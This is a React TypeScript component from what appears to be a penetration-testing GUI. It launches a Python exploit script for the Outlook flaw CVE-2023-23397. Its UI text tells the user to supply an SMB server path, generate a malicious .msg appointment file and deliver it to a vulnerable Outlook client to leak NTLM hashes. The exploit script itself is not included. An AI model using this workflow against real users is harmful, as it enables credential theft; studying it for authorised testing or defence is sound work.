import { Button, Stack, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useEffect, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { RenderComponent } from "../UserGuide/UserGuide";
import { LoadingOverlayAndCancelButton } from "../OverlayAndCancelButton/OverlayAndCancelButton";
import { checkAllCommandsAvailability } from "../../utils/CommandAvailability";
import InstallationModal from "../InstallationModal/InstallationModal";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile";

/**
 * Interface representing the form values for the CVE-2023-23397 exploit.
 */
interface FormValuesType {
    smbPath: string;
}

/**
 * CVE202323397 component responsible for CVE-2023-23397 simulation.
 */
export function CVE202323397() {
    const [loading, setLoading] = useState(false);
    const [output, setOutput] = useState("");
    const [allowSave, setAllowSave] = useState(false);
    const [hasSaved, setHasSaved] = useState(false);
    const [pid, setPid] = useState("");
    const [isCommandAvailable, setIsCommandAvailable] = useState(false);
    const [opened, setOpened] = useState(!isCommandAvailable);
    const [loadingModal, setLoadingModal] = useState(true);

    const title = "CVE-2023-23397";
    const description =
        "Simulates NTLMv2 hash leakage vulnerability in Microsoft Outlook by crafting a malicious .msg appointment file using MsgKit. " +
        "When opened in vulnerable Outlook clients, it sends NTLM hashes to a remote SMB server.";
    const steps =
        "Step 1: Enter your SMB server UNC path (e.g., \\\\192.168.1.10\\share).\n" +
        "Step 2: Click 'Generate .msg File' to craft the malicious file.\n" +
        "Step 3: Deliver the file to a vulnerable Outlook client to trigger NTLM hash leakage.";
    const sourceLink =
        "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/";
    const tutorial = "";
    const dependencies = ["python3"];

    const form = useForm<FormValuesType>({
        initialValues: {
            smbPath: "\\\\YOUR_SMB_SERVER\\share",
        },
    });

    useEffect(() => {
        checkAllCommandsAvailability(dependencies)
            .then((isAvailable) => {
                setIsCommandAvailable(isAvailable);
                setOpened(!isAvailable);
                setLoadingModal(false);
            })
            .catch(() => setLoadingModal(false));
    }, []);

    const handleProcessData = useCallback((data: string) => {
        setOutput((prev) => prev + "\n" + data);
    }, []);

    const handleProcessTermination = useCallback(
        ({ code, signal }: { code: number; signal: number }) => {
            if (code === 0) handleProcessData("\nProcess completed successfully.");
            else if (signal === 15) handleProcessData("\nProcess was manually terminated.");
            else handleProcessData(`\nProcess exited with code: ${code}, signal: ${signal}`);
            setPid("");
            setLoading(false);
            setAllowSave(true);
            setHasSaved(false);
        },
        [handleProcessData]
    );

    const onSubmit = async (values: FormValuesType) => {
        setLoading(true);
        setAllowSave(false);

        const args = ["./exploits/CVE-2023-23397.py", "--smb", values.smbPath];

        CommandHelper.runCommandGetPidAndOutput("python3", args, handleProcessData, handleProcessTermination)
            .then(({ output, pid }) => {
                setOutput(output);
                setPid(pid);
            })
            .catch((error) => {
                setOutput(error.message);
                setLoading(false);
                setAllowSave(true);
            });
    };

    const clearOutput = useCallback(() => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    }, []);

    const handleSaveComplete = () => {
        setHasSaved(true);
        setAllowSave(false);
    };

    return (
        <RenderComponent
            title={title}
            description={description}
            steps={steps}
            tutorial={tutorial}
            sourceLink={sourceLink}
        >
            <form onSubmit={form.onSubmit(onSubmit)}>
                <Stack>
                    {LoadingOverlayAndCancelButton(loading, pid)}

                    <TextInput label="SMB UNC Path" required {...form.getInputProps("smbPath")} />
                    <Button type="submit">Generate .msg File</Button>
                    {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                    <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                </Stack>
            </form>
            <InstallationModal
                isOpen={opened}
                setOpened={setOpened}
                feature_description={description}
                dependencies={dependencies}
            />
        </RenderComponent>
    );
}

export default CVE202323397;
